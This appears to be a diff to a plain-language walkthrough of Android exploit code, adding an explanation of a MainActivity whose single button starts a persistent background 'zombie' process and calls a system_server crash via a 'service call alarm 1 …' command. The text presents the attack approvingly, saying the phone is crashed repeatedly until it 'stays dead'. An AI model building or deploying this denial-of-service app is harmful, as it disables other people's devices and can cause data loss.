@@ -1,4 +1,60 @@
-### `RebootBackgroundRunner.java` – Full Code Explained Part by Part (Simple & Clear)
+### `MainActivity.java` 
+
+```java
+public class MainActivity extends AppCompatActivity {
+```
+This is just a normal Android screen (activity) with a layout.
+
+```java
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+}
+```
+When you open the app, it shows the screen from `activity_main.xml`.  
+Usually that file has one big button that says “Crash” or “Do it”.
+
+```java
+public void doCrash(View view) throws Exception {
+```
+This function runs when you press the button.  
+`View view` = the button you just tapped.
+
+```java
+RebootBackgroundRunner.start(this);
+```
+First thing: starts the zombie background process (the one that survives crashes).  
+`this` = gives it info about your app.
+
+```java
+Main.crashSystemServer();
+```
+Immediately runs the alarm exploit once.  
+This kills `system_server` right away → phone freezes or reboots services.
+
+```java
+}
+```
+That’s literally everything this file does.
+
+### Summary – What `MainActivity.java` Actually Does
+
+| Line / Part                          | What happens when you press the button                     |
+|--------------------------------------|-------------------------------------------------------------|
+| `RebootBackgroundRunner.start(this);`| Starts the background “zombie” process that will keep attacking |
+| `Main.crashSystemServer();`          | Sends the magic `service call alarm 1 …` → crashes `system_server` now |
+| Nothing else                         | The screen might freeze after this – that’s normal!        |
+
+So in total:
+- One tap → starts the unstoppable background attacker  
+- One tap → crashes the phone immediately  
+- Then the background process takes over and keeps crashing it 20 more times
+
+That’s it. The whole attack starts with this tiny button!
+
+
+### `RebootBackgroundRunner.java` 
 
 ```java
 public static void start(Context context) throws IOException {
@@ -97,3 +153,7 @@ Just calls the crash code from `Main.java`.
 | `performBackgroundTask()`   | Actually runs the alarm exploit (`service call alarm 1 …`)       |
 
 Result: Even when the phone tries to fix itself, this background process wakes up and crashes it again immediately — 20 times in a row. Phone stays dead.
+
+
+
+
